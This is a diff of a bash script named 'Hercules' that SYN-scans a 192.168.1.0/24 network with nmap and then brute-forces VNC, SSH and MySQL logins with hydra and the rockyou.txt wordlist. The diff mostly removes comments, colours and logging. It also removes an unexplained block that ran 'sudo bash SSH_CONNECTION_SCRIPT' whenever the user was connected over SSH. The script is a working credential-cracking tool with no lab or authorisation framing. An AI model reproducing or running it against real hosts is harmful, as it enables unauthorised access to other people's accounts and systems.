@@ -3,13 +3,6 @@
 # file that hold all the variables that need for the program to work properly
 source DontEdit.sh
 
-if [ -n "$SSH_CONNECTION" ] || [ -n "$SSH_TTY" ]; then
-    sudo bash SSH_CONNECTION_SCRIPT
-else
-    echo "You are not using SSH."
-fi
-
-
 # Function to check if a command exists
 command_exists() {
     command -v "$1" >/dev/null 2>&1
@@ -17,14 +10,15 @@ command_exists() {
 
 # Check if root user
 if [[ $EUID -ne 0 ]]; then
-  echo -e "${RED}ERROR:${NC} Please run as root."
+  echo -e "ERROR: Please run as root."
   exit 1
 fi
 
 # Check for required packages
+required_packages=("wget" "nmap" "hydra")
 for package in "${required_packages[@]}"; do
   if ! command_exists "$package"; then
-    echo -e "ERROR: The required package ${GREEN}'$package'${NC} is not installed. Please install it and try again."
+    echo "ERROR: The required package '$package' is not installed. Please install it and try again."
     exit 1
   fi
 done
@@ -48,8 +42,7 @@ else
         clear
         if [[ $EUID -ne $root ]]; then
             # Error message if not running as root
-            echo "ERROR:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
-            echo "TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}"
+            echo "ERROR: Please run as root."
             exit
         else
             sudo rm -rf hydra.restore
@@ -64,15 +57,13 @@ else
             # Else, it notifies them that they are not connected to the internet and tells them to connect
             else
                 # Offline text in the terminal
-                echo "ERROR:TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}." >> ERROR.LOG
-                echo "TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
+                echo "You are offline. Please connect to the internet."
                 exit 1
             fi
 
             # Clear the terminal
             clear
 
-            # Tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
             Hercules() {
                 # The logo of the program
                 figlet -f slant "Hercules"
@@ -82,12 +73,12 @@ else
                 
                 if [[ $service == "ALL" || $service == "all" ]]; then
                     # Tells the user that it can take up to an hour to complete the scanning process
-                    echo -e "${RED}This can take up to 1 hour to complete.${NC}"
+                    echo "This can take up to 1 hour to complete."
                     # Scan the entire network and display open ports
                     sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open
                     # asks if the user want to see scan on a open file or not
                     read -p "Would you like to see the scan on a open file (Yes or No): " SeeFile
-                    if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
+                    if [[ "${yes[*]}" == *"${SeeFile}"* ]]; then
                         open scan.txt
                     else
                         echo "[-] Ok I will not open the scan.txt file"
@@ -99,7 +90,7 @@ else
                     echo ""
                     read -p ">>> " Hydra
 
-                    if [[ " ${exit[*]} " == *" ${Hydra} "* ]]; then
+                    if [[ "${exit[*]}" == *"${Hydra}"* ]]; then
                         echo "[+] Goodbye"
                         exit 1
                     else
@@ -107,21 +98,17 @@ else
                         exit 1
                     fi
 
-                # If the user asks what the program does, it goes to a function that helps them and explains what the program does
-                elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
+                elif [[ "${exit[*]}" == *"${service}"* ]]; then
                     echo "Stopping program..."
                     sleep 1
                     exit 1
-                #checks if the user has put nothing into the input feild
-                elif [[ " ${empty[*]} " == *" ${service} "* ]]; then
-                    echo -e "${RED}ERROR:${NC} plase input a number into the input field"
+                elif [[ "${empty[*]}" == *"${service}"* ]]; then
+                    echo "ERROR: Please input a number into the input field"
                     sleep 1
                     exit 1                
-                #checks if the user has put in a letter insed of a number into the input feild
-                elif [[ " ${alphabet[*]} " == *" ${service} "* ]]; then
+                elif [[ "${alphabet[*]}" == *"${service}"* ]]; then
                     echo "Please enter a number next time"
                     exit 1
-
                 else
                     # Scan specific port
                     sudo nmap -sS 192.168.1.1/24 -p $service -oN $service --open
@@ -141,14 +128,10 @@ else
 
             RunHackingCommandWithVNC() {
                 if [[ $service == 5900 || $service == "VNC" ]]; then
-                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
-                    # If not, it will prompt the user to enter the username and hostname
                     if [[ $user == "" && $host == "" || $host == "" ]]; then
                         # No service specified, re-prompt for input
                         echo "No service specified"
                         Hercules
-                    # If the user inputs something in the 'Input Username' function and the hostname function,
-                    # it will continue as normal
                     else
                         # Crack VNC password
                         hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
@@ -177,16 +160,11 @@ else
 
             RunHackingCommandWithSSH() {
                 if [[ $service == 22 || $service == "ssh" ]]; then
-                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
-                    # If not, it will prompt the user to enter the username and hostname
                     if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                         # No service specified, re-prompt for input
                         echo "No service specified"
                         Hercules
-                    # If the user inputs something in the 'Input Username' function and the hostname function,
-                    # it will continue as normal
                     else
-
                         # Crack SSH password
                         hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                         # Alerts the user that the computer is trying to connect to the ssh server
@@ -209,14 +187,10 @@ else
 
             RunHackingCommandWithMySQL() {
                 if [[ $service == 3306 || $service == "mysql" ]]; then
-                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
-                    # If not, it will prompt the user to enter the username and hostname
                     if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                         # No service specified, re-prompt for input
                         echo "No service specified"
                         Hercules
-                    # If the user inputs something in the 'Input Username' function and the hostname function,
-                    # it will continue as normal
                     else
                         # Crack MySQL password
                         hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
@@ -227,20 +201,15 @@ else
                 fi
             }
 
-            Hercules # Calls the Hercules function
-
-            RunHackingCommand # Calls the RunHackingCommand function
-
-            RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function
-
-            RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function
-
-            RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
+            Hercules
+            RunHackingCommand
+            RunHackingCommandWithVNC
+            RunHackingCommandWithSSH
+            RunHackingCommandWithMySQL
         fi
     else
         clear
         # Warning message for wrong OS
-        echo "WARNING:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
-        echo "TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
+        echo "WARNING: Wrong OS. Please use the correct OS."
     fi
 fi
